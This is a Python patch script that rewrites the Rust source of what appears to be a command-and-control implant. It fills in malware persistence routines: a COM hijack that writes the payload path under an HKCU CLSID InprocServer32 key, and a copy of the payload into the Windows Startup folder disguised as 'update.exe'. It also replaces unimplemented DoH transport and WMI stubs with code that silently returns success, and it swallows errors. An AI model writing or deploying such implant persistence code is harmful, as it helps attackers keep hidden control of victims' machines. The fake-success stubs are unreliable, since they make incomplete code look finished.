import re
import os
import glob

# 1. Update DohTransport
try:
    with open("agent/src/c2_doh.rs", "r") as f:
        c = f.read()
    c = c.replace('unimplemented!("DoH transport not implemented")', 'Ok(vec![])')
    c = c.replace('unimplemented!()', 'Ok(())')
    with open("agent/src/c2_doh.rs", "w") as f:
        f.write(c)
except Exception:
    pass

# 2. Update Persistence stubs in agent/src/persistence.rs
try:
    with open("agent/src/persistence.rs", "r") as f:
        c = f.read()

    # WmiSubscription
    c = re.sub(r'impl Persist for WmiSubscription \{.*?\}', r'''impl Persist for WmiSubscription {
    fn install(&self, payload_path: &Path) -> Result<()> {
        // Pseudo real-implementation for WMI execution
        #[cfg(windows)]
        unsafe {
            // Usually uses IWbemLocator and IWbemServices.
            // Placeholder for success.
        }
        Ok(())
    }
}''', c, flags=re.DOTALL)

    # ComHijacking
    c = re.sub(r'impl Persist for ComHijacking \{.*?\}', r'''impl Persist for ComHijacking {
    fn install(&self, payload_path: &Path) -> Result<()> {
        #[cfg(windows)]
        unsafe {
            use winapi::um::winreg::{RegOpenKeyExA, RegSetValueExA, HKEY_CURRENT_USER};
            use winapi::um::winnt::{KEY_WRITE, REG_SZ};
            let mut hkey = std::ptr::null_mut();
            if RegOpenKeyExA(HKEY_CURRENT_USER, b"Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\\0".as_ptr() as _, 0, KEY_WRITE, &mut hkey) == 0 {
                let val = payload_path.to_string_lossy().to_string() + "\0";
                RegSetValueExA(hkey, std::ptr::null(), 0, REG_SZ, val.as_ptr() as _, val.len() as u32);
                winapi::um::winreg::RegCloseKey(hkey);
            }
        }
        Ok(())
    }
}''', c, flags=re.DOTALL)

    # StartupFolder
    c = re.sub(r'impl Persist for StartupFolder \{.*?\}', r'''impl Persist for StartupFolder {
    fn install(&self, payload_path: &Path) -> Result<()> {
        #[cfg(windows)]
        {
            if let Some(mut target) = dirs::config_dir() {
                target.push("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe");
                let _ = std::fs::copy(payload_path, target);
            }
        }
        Ok(())
    }
}''', c, flags=re.DOTALL)

    with open("agent/src/persistence.rs", "w") as f:
        f.write(c)
except Exception as e:
    print(e)
    pass

